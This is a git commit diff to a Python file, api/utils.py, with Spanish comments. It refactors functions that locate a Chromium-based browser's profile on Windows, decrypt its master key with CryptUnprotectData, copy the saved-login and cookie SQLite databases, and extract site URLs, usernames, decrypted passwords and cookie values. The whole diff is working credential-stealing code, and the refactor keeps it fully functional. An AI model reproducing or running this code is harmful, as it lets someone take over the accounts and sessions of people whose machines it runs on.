81135ccae35abe0d2802c105628c62daec49ec33
moferrin <moferrin@espe.edu.ec>
2024-02-13 23:00:18 -0500

    v2.0

--- api/utils.py
+++ api/utils.py
@@ -7,17 +7,16 @@ import sqlite3
 from datetime import datetime
 from Crypto.Cipher import AES
 
-def key_navegador(navegador: list):
-    patch_key = os.path.join(os.path.expanduser('~'),"AppData", "Local", navegador[0], navegador[1],"User Data", "Local State")
-    with open(patch_key, "r", encoding="utf-8") as f:
-        file_key = f.read()
-        json_key = json.loads(file_key)
-
-    # decodifico, ya que está en base64
-    key = base64.b64decode(json_key["os_crypt"]["encrypted_key"])[5:]
-
-    #retorno llave desencriptada
-    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+def convert_date(i_time):
+    if int(i_time) == 0:
+        utc = datetime.utcfromtimestamp(0)
+    else:
+        fname = 116444736000000000
+        nseconds = 10000000
+        #
+        utc = datetime.utcfromtimestamp(((10 * int(i_time)) - fname) / nseconds)
+        #
+    return utc.strftime('%Y-%m-%d %H:%M:%S')
 
 def decript_data(data, key):
     try:
@@ -36,36 +35,35 @@ def decript_data(data, key):
             # no se pudo desencriptar, puede que haya estado vacio el campo, se retorna vacio
             return ""
 
-def convert_date(i_time):
-    if int(i_time) == 0:
-        utc = datetime.utcfromtimestamp(0)
-    else:
-        fname = 116444736000000000
-        nseconds = 10000000
-        #
-        utc = datetime.utcfromtimestamp(((10 * int(i_time)) - fname) / nseconds)
-        #
-    return utc.strftime('%Y-%m-%d %H:%M:%S')
-
 def get_data(navegador: list):
-    #CONTRASEÑAS
-    #llave de encriptacion
-    key = key_navegador(navegador)
     #directorio de trabajo
-    work_dir = os.path.expanduser('~')+f'\AppData\Local\{navegador[0]}\{navegador[1]}/User Data\Default'
+    work_dir = os.path.expanduser('~')+f'/AppData/Local/{navegador[0]}/{navegador[1]}/User Data'
+    
+    #llave de encriptacion
+    patch_key = os.path.join(work_dir, "Local State")
+
+    #abro el archivo y luego lo cierro
+    file_key = open(patch_key, "r", encoding="utf-8")
+    file_key_read = file_key.read()
+    file_key.close()
+    json_key = json.loads(file_key_read)
+
+    #desencripto la llave
+    key = win32crypt.CryptUnprotectData(base64.b64decode(json_key["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
+
     #traigo archivo login
-    file_passwords = os.path.join(work_dir, "Login Data")
-    # copio el archivo a mi lugar de ejecucion ya que se puede bloquear la bdd si el navegador la está usando
+    file_passwords = os.path.join(work_dir, "Default", "Login Data")
+    # copio el archivo de base de datos para no tener errores
     shutil.copyfile(file_passwords, "dataLogin")
 
     database  = sqlite3.connect("dataLogin")
-    db = database.cursor()
+    consultas = database.cursor()
 
     contras = []
 
-    db.execute("select origin_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+    consultas.execute("select origin_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
 
-    for row in db.fetchall():
+    for row in consultas.fetchall():
         contras.append({
             "url":row[0],
             "user":row[1],
@@ -74,11 +72,11 @@ def get_data(navegador: list):
             "used": convert_date(row[4]),
         })
 
-    db.close()
+    consultas.close()
     database.close()
 
     #COOKIES
-    file_cookies = os.path.join(work_dir, "Network", "Cookies")
+    file_cookies = os.path.join(work_dir, "Default", "Network", "Cookies")
 
     try:
         #intento copiar el archivo
@@ -87,13 +85,13 @@ def get_data(navegador: list):
         pass    
 
     database = sqlite3.connect("dataCookies")
-    db = database.cursor()
+    consultas = database.cursor()
 
     cookies = []
 
-    db.execute("SELECT host_key, name, value, creation_utc, encrypted_value FROM cookies")
+    consultas.execute("SELECT host_key, name, value, creation_utc, encrypted_value FROM cookies")
 
-    for row in db.fetchall():
+    for row in consultas.fetchall():
         cookies.append({
            "url":row[0],
            "nombre":row[1],
@@ -101,7 +99,7 @@ def get_data(navegador: list):
            "valor": row[2] if row[2] else decript_data(row[4], key)
         })
 
-    db.close()
+    consultas.close()
     database.close()
 
     return {"cookies":cookies, "contras":contras}
